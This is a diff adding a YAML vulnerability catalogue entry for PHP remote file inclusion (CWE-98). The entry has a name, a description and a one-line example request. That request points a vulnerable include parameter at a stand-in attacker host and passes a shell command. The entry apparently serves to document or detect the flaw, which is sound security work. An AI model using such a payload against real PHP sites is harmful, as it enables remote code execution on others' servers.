@@ -1,0 +1,13 @@
+# VULN NAME
+name: PHP RFI
+
+# VULN CWE ID
+cwe: 98
+
+# VULN DESCRIPTION
+description: |
+  The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in "require," "include," or similar functions. 
+
+# VULN CODE SNIPPET
+code: |
+  victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l
